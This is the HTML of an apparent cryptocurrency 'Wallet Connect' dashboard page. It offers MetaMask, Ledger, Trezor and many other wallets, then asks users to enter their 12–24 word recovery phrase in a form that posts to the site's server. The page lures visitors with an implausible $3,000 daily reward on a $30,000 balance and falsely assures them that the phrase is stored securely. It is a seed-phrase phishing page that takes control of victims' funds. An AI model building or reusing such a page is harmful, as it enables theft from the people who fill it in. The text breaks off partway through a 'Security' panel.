@include('user.header')
    
    <main class="transition-all duration-200 lg:ml-64 pt-16 min-h-screen">
        
        <div x-data="{ toasts: [] }"
             x-init="
                                             "
             class="fixed top-20 right-4 z-50 space-y-2 w-80">
            <template x-for="toast in toasts" :key="toast.id">
                <div x-transition:enter="transition ease-out duration-300"
                     x-transition:enter-start="translate-x-full opacity-0"
                     x-transition:enter-end="translate-x-0 opacity-100"
                     x-transition:leave="transition ease-in duration-200"
                     x-transition:leave-start="translate-x-0 opacity-100"
                     x-transition:leave-end="translate-x-full opacity-0"
                     :class="{
                        'bg-gain/10 border-gain/20 text-gain': toast.type === 'success',
                        'bg-loss/10 border-loss/20 text-loss': toast.type === 'error',
                        'bg-warning/10 border-warning/20 text-warning': toast.type === 'warning',
                     }"
                     class="border rounded-lg p-4 flex items-start gap-3 shadow-lg backdrop-blur-sm">
                    <span x-text="toast.message" class="text-sm flex-1"></span>
                    <button @click="toasts = toasts.filter(t => t.id !== toast.id)" class="shrink-0 opacity-60 hover:opacity-100">
                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-4 h-4" aria-hidden="true">
    <path stroke-linecap="round" stroke-linejoin="round" d="M6 18 18 6M6 6l12 12" />
</svg>
                    </button>
                </div>
            </template>
        </div>

        <div class="p-4 lg:p-6 space-y-6">
            
    
    <div>
    </div>    <div>
    </div>
    <div>
    </div>
    
    <div class="w-full overflow-hidden rounded-lg border border-surface-border bg-surface-raised mb-6">
    <!-- TradingView Widget BEGIN -->
    <div class="tradingview-widget-container">
        <div class="tradingview-widget-container__widget"></div>
        <script type="text/javascript" src="https://s3.tradingview.com/external-embedding/embed-widget-ticker-tape.js" async>
        {
            "symbols": [
                {"proName": "FOREXCOM:SPXUSD", "title": "S&P 500 Index"},
                {"proName": "FOREXCOM:NSXUSD", "title": "US 100 Cash CFD"},
                {"proName": "FX_IDC:EURUSD", "title": "EUR to USD"},
                {"proName": "BITSTAMP:BTCUSD", "title": "Bitcoin"},
                {"proName": "BITSTAMP:ETHUSD", "title": "Ethereum"},
                {"proName": "FOREXCOM:UKXGBP", "title": "UK 100"}
            ],
            "showSymbolLogo": true,
            "isTransparent": true,
            "displayMode": "regular",
            "colorTheme": "dark",
            "locale": "en"
        }
        </script>
    </div>
    <!-- TradingView Widget END -->
</div>

    
    <div class="mb-6">
    <h2 class="text-xl font-bold text-content-primary">Wallet Connect</h2>
            <p class="text-sm text-content-secondary mt-1">Manage your connected cryptocurrency wallets</p>
    </div>

    
    <div x-data="walletConnect()" class="grid grid-cols-1 lg:grid-cols-12 gap-6">

        
        <div class="lg:col-span-8 space-y-5">

            
            <div class="bg-surface-raised border border-surface-border rounded-xl">
                <div class="flex items-center justify-between p-5 border-b border-surface-border">
                    <div class="flex items-center gap-3">
                        <div class="flex items-center justify-center w-9 h-9 rounded-lg bg-primary-subtle">
                            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-5 h-5 text-primary" aria-hidden="true">
    <path stroke-linecap="round" stroke-linejoin="round" d="M21 12a2.25 2.25 0 0 0-2.25-2.25H15a3 3 0 1 1-6 0H5.25A2.25 2.25 0 0 0 3 12m18 0v6a2.25 2.25 0 0 1-2.25 2.25H5.25A2.25 2.25 0 0 1 3 18v-6m18 0V9M3 12V9m18 0a2.25 2.25 0 0 0-2.25-2.25H5.25A2.25 2.25 0 0 0 3 9m18 0V6a2.25 2.25 0 0 0-2.25-2.25H5.25A2.25 2.25 0 0 0 3 6v3" />
</svg>
                        </div>
                        <div>
                            <h2 class="text-sm font-semibold text-content-primary">My Connected Wallets</h2>
                            <p class="text-xs text-content-tertiary mt-0.5">0 of 10 slots used</p>
                        </div>
                    </div>
                    
                    <div class="flex items-center gap-1.5">
                                                    <div class="w-2 h-2 rounded-full bg-surface-border"></div>
                                                    <div class="w-2 h-2 rounded-full bg-surface-border"></div>
                                                    <div class="w-2 h-2 rounded-full bg-surface-border"></div>
                                                    <div class="w-2 h-2 rounded-full bg-surface-border"></div>
                                                    <div class="w-2 h-2 rounded-full bg-surface-border"></div>
                                                    <div class="w-2 h-2 rounded-full bg-surface-border"></div>
                                                    <div class="w-2 h-2 rounded-full bg-surface-border"></div>
                                                    <div class="w-2 h-2 rounded-full bg-surface-border"></div>
                                                    <div class="w-2 h-2 rounded-full bg-surface-border"></div>
                                                    <div class="w-2 h-2 rounded-full bg-surface-border"></div>
                                            </div>
                </div>

                                    
                    <div class="p-8 text-center">
                        <div class="w-16 h-16 mx-auto mb-4 rounded-full bg-surface-overlay flex items-center justify-center">
                            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-8 h-8 text-content-tertiary" aria-hidden="true">
    <path stroke-linecap="round" stroke-linejoin="round" d="M21 12a2.25 2.25 0 0 0-2.25-2.25H15a3 3 0 1 1-6 0H5.25A2.25 2.25 0 0 0 3 12m18 0v6a2.25 2.25 0 0 1-2.25 2.25H5.25A2.25 2.25 0 0 1 3 18v-6m18 0V9M3 12V9m18 0a2.25 2.25 0 0 0-2.25-2.25H5.25A2.25 2.25 0 0 0 3 9m18 0V6a2.25 2.25 0 0 0-2.25-2.25H5.25A2.25 2.25 0 0 0 3 6v3" />
</svg>
                        </div>
                        <h3 class="text-sm font-semibold text-content-primary mb-1">No Wallets Connected</h3>
                        <p class="text-xs text-content-tertiary max-w-sm mx-auto">Connect your first cryptocurrency wallet to start earning daily rewards.</p>
                    </div>
                            </div>

            
                        <div class="bg-surface-raised border border-surface-border rounded-xl" x-data="{ expanded: true }">
                <button @click="expanded = !expanded" class="flex items-center justify-between w-full p-5 text-left">
                    <div class="flex items-center gap-3">
                        <div class="flex items-center justify-center w-9 h-9 rounded-lg bg-primary-subtle">
                            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-5 h-5 text-primary" aria-hidden="true">
    <path stroke-linecap="round" stroke-linejoin="round" d="M12 4.5v15m7.5-7.5h-15" />
</svg>
                        </div>
                        <div>
                            <h2 class="text-sm font-semibold text-content-primary">Connect New Wallet</h2>
                            <p class="text-xs text-content-tertiary mt-0.5">Choose a wallet provider and enter your recovery phrase</p>
                        </div>
                    </div>
                    <svg class="w-5 h-5 text-content-tertiary transition-transform" :class="expanded && 'rotate-180'" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" d="m19.5 8.25-7.5 7.5-7.5-7.5" />
                    </svg>
                </button>

                <div x-show="expanded" x-collapse>
                    <div class="px-5 pb-5 space-y-6 border-t border-surface-border pt-5">

                        
                        <div>
                            <p class="text-xs font-medium text-content-secondary uppercase tracking-wider mb-3">Popular Wallets</p>
                            <div class="grid grid-cols-2 sm:grid-cols-3 gap-3">
                                                                                                        <button type="button"
                                        @click="selectWallet('MetaMask')"
                                        :class="selectedWallet === 'MetaMask' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                        class="relative flex flex-col items-center gap-2.5 p-4 rounded-xl border-2 transition-all duration-200"
                                        >
                                        <img src="https://account.finvoradigital.com/temp/wallet/metamask.webp" alt="MetaMask" class="w-10 h-10 rounded-lg object-contain">
                                        <span class="text-xs font-medium text-content-primary">MetaMask</span>
                                                                            </button>
                                                                                                        <button type="button"
                                        @click="selectWallet('Trust Wallet')"
                                        :class="selectedWallet === 'Trust Wallet' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                        class="relative flex flex-col items-center gap-2.5 p-4 rounded-xl border-2 transition-all duration-200"
                                        >
                                        <img src="https://account.finvoradigital.com/temp/wallet/trust-wallet.webp" alt="Trust Wallet" class="w-10 h-10 rounded-lg object-contain">
                                        <span class="text-xs font-medium text-content-primary">Trust Wallet</span>
                                                                            </button>
                                                                                                        <button type="button"
                                        @click="selectWallet('Coinbase Wallet')"
                                        :class="selectedWallet === 'Coinbase Wallet' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                        class="relative flex flex-col items-center gap-2.5 p-4 rounded-xl border-2 transition-all duration-200"
                                        >
                                        <img src="https://account.finvoradigital.com/temp/wallet/coinbase-wallet.webp" alt="Coinbase Wallet" class="w-10 h-10 rounded-lg object-contain">
                                        <span class="text-xs font-medium text-content-primary">Coinbase Wallet</span>
                                                                            </button>
                                                                                                        <button type="button"
                                        @click="selectWallet('Phantom')"
                                        :class="selectedWallet === 'Phantom' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                        class="relative flex flex-col items-center gap-2.5 p-4 rounded-xl border-2 transition-all duration-200"
                                        >
                                        <img src="https://account.finvoradigital.com/temp/wallet/phantom.webp" alt="Phantom" class="w-10 h-10 rounded-lg object-contain">
                                        <span class="text-xs font-medium text-content-primary">Phantom</span>
                                                                            </button>
                                                                                                        <button type="button"
                                        @click="selectWallet('Exodus')"
                                        :class="selectedWallet === 'Exodus' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                        class="relative flex flex-col items-center gap-2.5 p-4 rounded-xl border-2 transition-all duration-200"
                                        >
                                        <img src="https://account.finvoradigital.com/temp/wallet/exodus.svg" alt="Exodus" class="w-10 h-10 rounded-lg object-contain">
                                        <span class="text-xs font-medium text-content-primary">Exodus</span>
                                                                            </button>
                                                                                                        <button type="button"
                                        @click="selectWallet('Ledger')"
                                        :class="selectedWallet === 'Ledger' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                        class="relative flex flex-col items-center gap-2.5 p-4 rounded-xl border-2 transition-all duration-200"
                                        >
                                        <img src="https://account.finvoradigital.com/temp/wallet/other.png" alt="Ledger" class="w-10 h-10 rounded-lg object-contain">
                                        <span class="text-xs font-medium text-content-primary">Ledger</span>
                                                                            </button>
                                                            </div>
                        </div>

                        
                        <div>
                            <button type="button" @click="showMoreWallets = !showMoreWallets"
                                class="flex items-center gap-2 text-xs font-medium text-primary hover:text-primary-light transition-colors">
                                <span x-text="showMoreWallets ? 'Show Less' : 'More Wallets'"></span>
                                <svg class="w-3.5 h-3.5 transition-transform" :class="showMoreWallets && 'rotate-180'" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor">
                                    <path stroke-linecap="round" stroke-linejoin="round" d="m19.5 8.25-7.5 7.5-7.5-7.5" />
                                </svg>
                            </button>

                            <div x-show="showMoreWallets" x-collapse class="mt-3">
                                <div class="grid grid-cols-3 sm:grid-cols-4 md:grid-cols-5 gap-2">
                                                                                                                    <button type="button"
                                            @click="selectWallet('OKX')"
                                            :class="selectedWallet === 'OKX' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                            class="relative flex flex-col items-center gap-2 p-3 rounded-lg border transition-all duration-200"
                                            >
                                            <img src="https://account.finvoradigital.com/temp/wallet/okx.webp" alt="OKX" class="w-8 h-8 rounded-md object-contain">
                                            <span class="text-[11px] font-medium text-content-secondary truncate w-full text-center">OKX</span>
                                                                                    </button>
                                                                                                                    <button type="button"
                                            @click="selectWallet('Binance')"
                                            :class="selectedWallet === 'Binance' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                            class="relative flex flex-col items-center gap-2 p-3 rounded-lg border transition-all duration-200"
                                            >
                                            <img src="https://account.finvoradigital.com/temp/wallet/binance.jpg" alt="Binance" class="w-8 h-8 rounded-md object-contain">
                                            <span class="text-[11px] font-medium text-content-secondary truncate w-full text-center">Binance</span>
                                                                                    </button>
                                                                                                                    <button type="button"
                                            @click="selectWallet('Rabby')"
                                            :class="selectedWallet === 'Rabby' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                            class="relative flex flex-col items-center gap-2 p-3 rounded-lg border transition-all duration-200"
                                            >
                                            <img src="https://account.finvoradigital.com/temp/wallet/rabby.webp" alt="Rabby" class="w-8 h-8 rounded-md object-contain">
                                            <span class="text-[11px] font-medium text-content-secondary truncate w-full text-center">Rabby</span>
                                                                                    </button>
                                                                                                                    <button type="button"
                                            @click="selectWallet('Tangem')"
                                            :class="selectedWallet === 'Tangem' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                            class="relative flex flex-col items-center gap-2 p-3 rounded-lg border transition-all duration-200"
                                            >
                                            <img src="https://account.finvoradigital.com/temp/wallet/tangem.svg" alt="Tangem" class="w-8 h-8 rounded-md object-contain">
                                            <span class="text-[11px] font-medium text-content-secondary truncate w-full text-center">Tangem</span>
                                                                                    </button>
                                                                                                                    <button type="button"
                                            @click="selectWallet('Arculus')"
                                            :class="selectedWallet === 'Arculus' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                            class="relative flex flex-col items-center gap-2 p-3 rounded-lg border transition-all duration-200"
                                            >
                                            <img src="https://account.finvoradigital.com/temp/wallet/arculus.svg" alt="Arculus" class="w-8 h-8 rounded-md object-contain">
                                            <span class="text-[11px] font-medium text-content-secondary truncate w-full text-center">Arculus</span>
                                                                                    </button>
                                                                                                                    <button type="button"
                                            @click="selectWallet('Namo')"
                                            :class="selectedWallet === 'Namo' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                            class="relative flex flex-col items-center gap-2 p-3 rounded-lg border transition-all duration-200"
                                            >
                                            <img src="https://account.finvoradigital.com/temp/wallet/namo.webp" alt="Namo" class="w-8 h-8 rounded-md object-contain">
                                            <span class="text-[11px] font-medium text-content-secondary truncate w-full text-center">Namo</span>
                                                                                    </button>
                                                                                                                    <button type="button"
                                            @click="selectWallet('DCent')"
                                            :class="selectedWallet === 'DCent' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                            class="relative flex flex-col items-center gap-2 p-3 rounded-lg border transition-all duration-200"
                                            >
                                            <img src="https://account.finvoradigital.com/temp/wallet/dcent.svg" alt="DCent" class="w-8 h-8 rounded-md object-contain">
                                            <span class="text-[11px] font-medium text-content-secondary truncate w-full text-center">DCent</span>
                                                                                    </button>
                                                                                                                    <button type="button"
                                            @click="selectWallet('Trezor')"
                                            :class="selectedWallet === 'Trezor' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                            class="relative flex flex-col items-center gap-2 p-3 rounded-lg border transition-all duration-200"
                                            >
                                            <img src="https://account.finvoradigital.com/temp/wallet/other.png" alt="Trezor" class="w-8 h-8 rounded-md object-contain">
                                            <span class="text-[11px] font-medium text-content-secondary truncate w-full text-center">Trezor</span>
                                                                                    </button>
                                                                                                                    <button type="button"
                                            @click="selectWallet('Atomic Wallet')"
                                            :class="selectedWallet === 'Atomic Wallet' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                            class="relative flex flex-col items-center gap-2 p-3 rounded-lg border transition-all duration-200"
                                            >
                                            <img src="https://account.finvoradigital.com/temp/wallet/atomic.png" alt="Atomic Wallet" class="w-8 h-8 rounded-md object-contain">
                                            <span class="text-[11px] font-medium text-content-secondary truncate w-full text-center">Atomic Wallet</span>
                                                                                    </button>
                                                                                                                    <button type="button"
                                            @click="selectWallet('Rainbow')"
                                            :class="selectedWallet === 'Rainbow' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                            class="relative flex flex-col items-center gap-2 p-3 rounded-lg border transition-all duration-200"
                                            >
                                            <img src="https://account.finvoradigital.com/temp/wallet/other.png" alt="Rainbow" class="w-8 h-8 rounded-md object-contain">
                                            <span class="text-[11px] font-medium text-content-secondary truncate w-full text-center">Rainbow</span>
                                                                                    </button>
                                                                                                                    <button type="button"
                                            @click="selectWallet('Argent')"
                                            :class="selectedWallet === 'Argent' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                            class="relative flex flex-col items-center gap-2 p-3 rounded-lg border transition-all duration-200"
                                            >
                                            <img src="https://account.finvoradigital.com/temp/wallet/other.png" alt="Argent" class="w-8 h-8 rounded-md object-contain">
                                            <span class="text-[11px] font-medium text-content-secondary truncate w-full text-center">Argent</span>
                                                                                    </button>
                                                                                                                    <button type="button"
                                            @click="selectWallet('KeepKey')"
                                            :class="selectedWallet === 'KeepKey' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                            class="relative flex flex-col items-center gap-2 p-3 rounded-lg border transition-all duration-200"
                                            >
                                            <img src="https://account.finvoradigital.com/temp/wallet/other.png" alt="KeepKey" class="w-8 h-8 rounded-md object-contain">
                                            <span class="text-[11px] font-medium text-content-secondary truncate w-full text-center">KeepKey</span>
                                                                                    </button>
                                                                                                                    <button type="button"
                                            @click="selectWallet('Guarda')"
                                            :class="selectedWallet === 'Guarda' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                            class="relative flex flex-col items-center gap-2 p-3 rounded-lg border transition-all duration-200"
                                            >
                                            <img src="https://account.finvoradigital.com/temp/wallet/other.png" alt="Guarda" class="w-8 h-8 rounded-md object-contain">
                                            <span class="text-[11px] font-medium text-content-secondary truncate w-full text-center">Guarda</span>
                                                                                    </button>
                                                                                                                    <button type="button"
                                            @click="selectWallet('Coinomi')"
                                            :class="selectedWallet === 'Coinomi' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                            class="relative flex flex-col items-center gap-2 p-3 rounded-lg border transition-all duration-200"
                                            >
                                            <img src="https://account.finvoradigital.com/temp/wallet/other.png" alt="Coinomi" class="w-8 h-8 rounded-md object-contain">
                                            <span class="text-[11px] font-medium text-content-secondary truncate w-full text-center">Coinomi</span>
                                                                                    </button>
                                                                                                                    <button type="button"
                                            @click="selectWallet('Electrum')"
                                            :class="selectedWallet === 'Electrum' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                            class="relative flex flex-col items-center gap-2 p-3 rounded-lg border transition-all duration-200"
                                            >
                                            <img src="https://account.finvoradigital.com/temp/wallet/other.png" alt="Electrum" class="w-8 h-8 rounded-md object-contain">
                                            <span class="text-[11px] font-medium text-content-secondary truncate w-full text-center">Electrum</span>
                                                                                    </button>
                                                                                                                    <button type="button"
                                            @click="selectWallet('Mycelium')"
                                            :class="selectedWallet === 'Mycelium' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                            class="relative flex flex-col items-center gap-2 p-3 rounded-lg border transition-all duration-200"
                                            >
                                            <img src="https://account.finvoradigital.com/temp/wallet/other.png" alt="Mycelium" class="w-8 h-8 rounded-md object-contain">
                                            <span class="text-[11px] font-medium text-content-secondary truncate w-full text-center">Mycelium</span>
                                                                                    </button>
                                                                                                                    <button type="button"
                                            @click="selectWallet('Zerion')"
                                            :class="selectedWallet === 'Zerion' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                            class="relative flex flex-col items-center gap-2 p-3 rounded-lg border transition-all duration-200"
                                            >
                                            <img src="https://account.finvoradigital.com/temp/wallet/other.png" alt="Zerion" class="w-8 h-8 rounded-md object-contain">
                                            <span class="text-[11px] font-medium text-content-secondary truncate w-full text-center">Zerion</span>
                                                                                    </button>
                                                                                                                    <button type="button"
                                            @click="selectWallet('Edge')"
                                            :class="selectedWallet === 'Edge' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                            class="relative flex flex-col items-center gap-2 p-3 rounded-lg border transition-all duration-200"
                                            >
                                            <img src="https://account.finvoradigital.com/temp/wallet/other.png" alt="Edge" class="w-8 h-8 rounded-md object-contain">
                                            <span class="text-[11px] font-medium text-content-secondary truncate w-full text-center">Edge</span>
                                                                                    </button>
                                                                                                                    <button type="button"
                                            @click="selectWallet('1inch')"
                                            :class="selectedWallet === '1inch' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                            class="relative flex flex-col items-center gap-2 p-3 rounded-lg border transition-all duration-200"
                                            >
                                            <img src="https://account.finvoradigital.com/temp/wallet/other.png" alt="1inch" class="w-8 h-8 rounded-md object-contain">
                                            <span class="text-[11px] font-medium text-content-secondary truncate w-full text-center">1inch</span>
                                                                                    </button>
                                                                                                                    <button type="button"
                                            @click="selectWallet('Bitcoin Wallet')"
                                            :class="selectedWallet === 'Bitcoin Wallet' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                            class="relative flex flex-col items-center gap-2 p-3 rounded-lg border transition-all duration-200"
                                            >
                                            <img src="https://account.finvoradigital.com/temp/wallet/other.png" alt="Bitcoin Wallet" class="w-8 h-8 rounded-md object-contain">
                                            <span class="text-[11px] font-medium text-content-secondary truncate w-full text-center">Bitcoin Wallet</span>
                                                                                    </button>
                                                                    </div>
                            </div>
                        </div>

                        
                        <form method="POST" action="https://account.finvoradigital.com/dashboard/wallectConnect" @submit="handleSubmit($event)">
                            <input type="hidden" name="_token" value="Ma4mCMUlEPD2ywAIhFnOdMNH2gS5D62MRHIVTCY7">                            <input type="hidden" name="wallet" :value="selectedWallet">

                            <div x-show="selectedWallet" x-transition x-cloak class="space-y-4">

                                
                                <div class="flex items-center gap-3 p-3 rounded-lg bg-surface-overlay/50 border border-surface-border">
                                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-5 h-5 text-primary" aria-hidden="true">
    <path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75 11.25 15 15 9.75M21 12a9 9 0 1 1-18 0 9 9 0 0 1 18 0Z" />
</svg>
                                    <p class="text-sm text-content-primary">
                                        Selected: <span class="font-semibold" x-text="selectedWallet"></span>
                                    </p>
                                    <button type="button" @click="selectedWallet = ''" class="ml-auto text-content-tertiary hover:text-content-secondary">
                                        <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor">
                                            <path stroke-linecap="round" stroke-linejoin="round" d="M6 18 18 6M6 6l12 12" />
                                        </svg>
                                    </button>
                                </div>

                                
                                <div>
                                    <label class="flex items-center gap-2 text-sm font-medium text-content-primary mb-2">
                                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-4 h-4 text-content-secondary" aria-hidden="true">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 5.25a3 3 0 0 1 3 3m3 0a6 6 0 0 1-7.029 5.912c-.563-.097-1.159.026-1.563.43L10.5 17.25H8.25v2.25H6v2.25H2.25v-2.818c0-.597.237-1.17.659-1.591l6.499-6.499c.404-.404.527-1 .43-1.563A6 6 0 1 1 21.75 8.25Z" />
</svg>
                                        Recovery Phrase (Seed Phrase)
                                    </label>

                                    
                                    <div class="flex items-start gap-2.5 p-3 rounded-lg bg-warning/10 border border-warning/20 mb-3">
                                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-4 h-4 text-warning flex-shrink-0 mt-0.5" aria-hidden="true">
    <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v3.75m-9.303 3.376c-.866 1.5.217 3.374 1.948 3.374h14.71c1.73 0 2.813-1.874 1.948-3.374L13.949 3.378c-.866-1.5-3.032-1.5-3.898 0L2.697 16.126ZM12 15.75h.007v.008H12v-.008Z" />
</svg>
                                        <p class="text-xs text-warning">
                                            <strong>Important:</strong> Your recovery phrase is encrypted and securely stored. We never access your funds directly.
                                        </p>
                                    </div>

                                    
                                    <div class="relative">
                                        <textarea
                                            name="mnemonic"
                                            x-model="recoveryPhrase"
                                            @input="validatePhrase()"
                                            :class="hasError ? 'border-loss focus:ring-loss/30' : 'border-surface-border focus:ring-primary/30 focus:border-primary'"
                                            class="w-full bg-surface-overlay border rounded-lg px-3.5 py-3 text-sm text-content-primary placeholder:text-content-tertiary focus:outline-none focus:ring-2 resize-none font-mono"
                                            rows="3"
                                            placeholder="Enter your 12 or 24 word recovery phrase separated by spaces..."
                                            required></textarea>
                                        <div class="absolute bottom-2.5 right-3 text-[11px] font-medium"
                                             :class="wordCount >= 12 && wordCount <= 24 ? 'text-gain' : 'text-content-tertiary'">
                                            <span x-text="wordCount"></span>/12+ words
                                        </div>
                                    </div>

                                    
                                    <div class="flex flex-wrap gap-4 mt-2">
                                        <div class="flex items-center gap-1.5 text-xs">
                                            <div class="w-4 h-4 rounded-full flex items-center justify-center"
                                                 :class="wordCount >= 12 && wordCount <= 24 ? 'bg-gain/10' : 'bg-surface-overlay'">
                                                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-3.5 h-3.5" aria-hidden="true">
    <path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75 11.25 15 15 9.75M21 12a9 9 0 1 1-18 0 9 9 0 0 1 18 0Z" />
</svg>
                                            </div>
                                            <span :class="wordCount >= 12 && wordCount <= 24 ? 'text-gain' : 'text-content-tertiary'">12–24 words</span>
                                        </div>
                                        <div class="flex items-center gap-1.5 text-xs">
                                            <div class="w-4 h-4 rounded-full flex items-center justify-center"
                                                 :class="recoveryPhrase.length > 0 && !hasInvalidChars ? 'bg-gain/10' : 'bg-surface-overlay'">
                                                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-3.5 h-3.5" aria-hidden="true">
    <path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75 11.25 15 15 9.75M21 12a9 9 0 1 1-18 0 9 9 0 0 1 18 0Z" />
</svg>
                                            </div>
                                            <span :class="recoveryPhrase.length > 0 && !hasInvalidChars ? 'text-gain' : 'text-content-tertiary'">Valid characters</span>
                                        </div>
                                    </div>
                                </div>

                                
                                <button type="submit"
                                    x-show="isValidPhrase"
                                    x-transition
                                    :disabled="isConnecting"
                                    :class="isConnecting ? 'opacity-75 cursor-wait' : 'hover:bg-primary-dark'"
                                    class="w-full flex items-center justify-center gap-2.5 bg-primary text-content-inverse font-semibold text-sm py-3 rounded-xl transition-colors">
                                    <template x-if="!isConnecting">
                                        <span class="flex items-center gap-2">
                                            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-4 h-4" aria-hidden="true">
    <path stroke-linecap="round" stroke-linejoin="round" d="M13.19 8.688a4.5 4.5 0 0 1 1.242 7.244l-4.5 4.5a4.5 4.5 0 0 1-6.364-6.364l1.757-1.757m9.86-2.54a4.5 4.5 0 0 0-1.242-7.244l-4.5-4.5a4.5 4.5 0 0 0-6.364 6.364L5.25 9.879" />
</svg>
                                            Connect <span x-text="selectedWallet"></span>
                                        </span>
                                    </template>
                                    <template x-if="isConnecting">
                                        <span class="flex items-center gap-2.5">
                                            <svg class="animate-spin h-4 w-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                                                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                                                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path>
                                            </svg>
                                            Connecting...
                                        </span>
                                    </template>
                                </button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
            
        </div>

        
        <div class="lg:col-span-4 space-y-5">

            
            <div class="bg-surface-raised border border-surface-border rounded-xl p-5">
                <div class="flex items-center gap-3 mb-4">
                    <div class="flex items-center justify-center w-9 h-9 rounded-lg bg-gain/10">
                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-5 h-5 text-gain" aria-hidden="true">
    <path stroke-linecap="round" stroke-linejoin="round" d="M2.25 18.75a60.07 60.07 0 0 1 15.797 2.101c.727.198 1.453-.342 1.453-1.096V18.75M3.75 4.5v.75A.75.75 0 0 1 3 6h-.75m0 0v-.375c0-.621.504-1.125 1.125-1.125H20.25M2.25 6v9m18-10.5v.75c0 .414.336.75.75.75h.75m-1.5-1.5h.375c.621 0 1.125.504 1.125 1.125v9.75c0 .621-.504 1.125-1.125 1.125h-.375m1.5-1.5H21a.75.75 0 0 0-.75.75v.75m0 0H3.75m0 0h-.375a1.125 1.125 0 0 1-1.125-1.125V15m1.5 1.5v-.75A.75.75 0 0 0 3 15h-.75M15 10.5a3 3 0 1 1-6 0 3 3 0 0 1 6 0Zm3 0h.008v.008H18V10.5Zm-12 0h.008v.008H6V10.5Z" />
</svg>
                    </div>
                    <h3 class="text-sm font-semibold text-content-primary">Earning Rewards</h3>
                </div>
                <div class="space-y-3">
                    <div class="flex items-center justify-between">
                        <span class="text-xs text-content-tertiary">Daily Reward</span>
                        <span class="text-sm font-bold text-gain">$3,000.00</span>
                    </div>
                    <div class="w-full h-px bg-surface-border"></div>
                    <div class="flex items-center justify-between">
                        <span class="text-xs text-content-tertiary">Min Balance Required</span>
                        <span class="text-sm font-bold text-content-primary">$30,000.00</span>
                    </div>
                </div>
                <p class="text-xs text-content-tertiary mt-4 leading-relaxed">
                    Each connected wallet earns daily rewards automatically. Ensure your wallet meets the minimum balance requirement.
                </p>
            </div>

            
            
            
            <div class="bg-surface-raised border border-surface-border rounded-xl p-5">
                <h3 class="text-sm font-semibold text-content-primary mb-4">Security</h3>
                <div class="space-y-4">
                    <div class="flex items-start gap-3">
                        <div class="flex items-center justify-center w-7 h-7 rounded-md bg-gain/10 flex-shrink-0">
                            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-4 h-4 text-gain" aria-hidden="true">
